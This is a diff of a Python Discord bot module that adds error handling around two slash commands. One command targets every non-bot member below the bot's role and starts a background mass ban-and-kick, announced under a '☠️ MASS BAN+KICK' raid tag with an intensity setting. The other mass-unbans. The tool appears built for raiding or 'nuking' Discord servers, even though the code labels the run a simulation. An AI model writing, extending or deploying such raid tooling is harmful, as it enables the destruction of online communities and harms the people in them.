@@ -73,48 +73,54 @@ class Ban(commands.Cog):
         # Defer so we have time to chunk members (can take a second on large servers)
         await interaction.response.defer()
 
-        # Force-fetch all members — guild.members is often empty without this
         try:
-            await guild.chunk(cache=True)
-        except Exception:
-            pass  # Best-effort; carry on with whatever is cached
+            try:
+                await guild.chunk(cache=True)
+            except Exception:
+                pass
 
-        targets = [
-            m for m in guild.members
-            if not m.bot
-            and m.id != interaction.user.id
-            and m.id != me.id
-            and (not skip_admins or not m.guild_permissions.administrator)
-            # Can't ban/kick members with equal or higher top role
-            and m.top_role < me.top_role
-        ]
+            targets = [
+                m for m in guild.members
+                if not m.bot
+                and m.id != interaction.user.id
+                and m.id != me.id
+                and (not skip_admins or not m.guild_permissions.administrator)
+                and m.top_role < me.top_role
+            ]
 
-        if not targets:
+            if not targets:
+                await interaction.followup.send(
+                    "⚠️ No eligible targets found.\n"
+                    "Possible reasons:\n"
+                    "• All members have a role equal to or higher than the bot's role\n"
+                    "• Members Intent is not enabled in the Discord Developer Portal\n"
+                    "• Server has no non-bot members other than you",
+                    ephemeral=True,
+                )
+                return
+
+            bot_state.reset()
+            bot_state.rate_controller.set_intensity(intensity)
+            bot_state.active_simulation = "banevery1"
+
             await interaction.followup.send(
-                "⚠️ No eligible targets found.\n"
-                "Possible reasons:\n"
-                "• All members have a role equal to or higher than the bot's role\n"
-                "• Members Intent is not enabled in the Discord Developer Portal\n"
-                "• Server has no non-bot members other than you",
-                ephemeral=True,
+                f"☠️ **MASS BAN+KICK — {RAID_TAG}**\n"
+                f"┣ Targets    : `{len(targets)}`\n"
+                f"┣ Intensity  : `{intensity}/10`\n"
+                f"┣ Kick first : `{'✅' if kick_first else '❌'}`\n"
+                f"┣ Skip admins: `{'✅' if skip_admins else '❌'}`\n"
+                f"┗ `/stop` halts immediately.",
             )
-            return
 
-        bot_state.reset()
-        bot_state.rate_controller.set_intensity(intensity)
-        bot_state.active_simulation = "banevery1"
+            task = asyncio.create_task(self._run(interaction, guild, targets, kick_first))
+            bot_state.add_task(task)
 
-        await interaction.followup.send(
-            f"☠️ **MASS BAN+KICK — {RAID_TAG}**\n"
-            f"┣ Targets    : `{len(targets)}`\n"
-            f"┣ Intensity  : `{intensity}/10`\n"
-            f"┣ Kick first : `{'✅' if kick_first else '❌'}`\n"
-            f"┣ Skip admins: `{'✅' if skip_admins else '❌'}`\n"
-            f"┗ `/stop` halts immediately.",
-        )
-
-        task = asyncio.create_task(self._run(interaction, guild, targets, kick_first))
-        bot_state.add_task(task)
+        except Exception as exc:
+            bot_state.active_simulation = None
+            try:
+                await interaction.followup.send(f"❌ Error: `{exc}`", ephemeral=True)
+            except Exception:
+                pass
 
     async def _run(
         self,
@@ -226,25 +232,31 @@ class Ban(commands.Cog):
 
         await interaction.response.defer()
 
-        # Fetch the full ban list
         try:
-            bans: list[discord.BanEntry] = [entry async for entry in guild.bans()]
-        except discord.HTTPException as exc:
-            await interaction.followup.send(f"❌ Failed to fetch ban list: {exc}", ephemeral=True)
-            return
+            try:
+                bans: list[discord.BanEntry] = [entry async for entry in guild.bans()]
+            except discord.HTTPException as exc:
+                await interaction.followup.send(f"❌ Failed to fetch ban list: {exc}", ephemeral=True)
+                return
 
-        if not bans:
-            await interaction.followup.send("✅ No one is currently banned.", ephemeral=True)
-            return
+            if not bans:
+                await interaction.followup.send("✅ No one is currently banned.", ephemeral=True)
+                return
 
-        await interaction.followup.send(
-            f"✅ **MASS UNBAN — {RAID_TAG}**\n"
-            f"┣ Found : `{len(bans)}` banned users\n"
-            f"┗ Unbanning now…"
-        )
+            await interaction.followup.send(
+                f"✅ **MASS UNBAN — {RAID_TAG}**\n"
+                f"┣ Found : `{len(bans)}` banned users\n"
+                f"┗ Unbanning now…"
+            )
 
-        task = asyncio.create_task(self._run_unban(interaction, guild, bans))
-        bot_state.add_task(task)
+            task = asyncio.create_task(self._run_unban(interaction, guild, bans))
+            bot_state.add_task(task)
+
+        except Exception as exc:
+            try:
+                await interaction.followup.send(f"❌ Error: `{exc}`", ephemeral=True)
+            except Exception:
+                pass
 
     async def _run_unban(
         self,
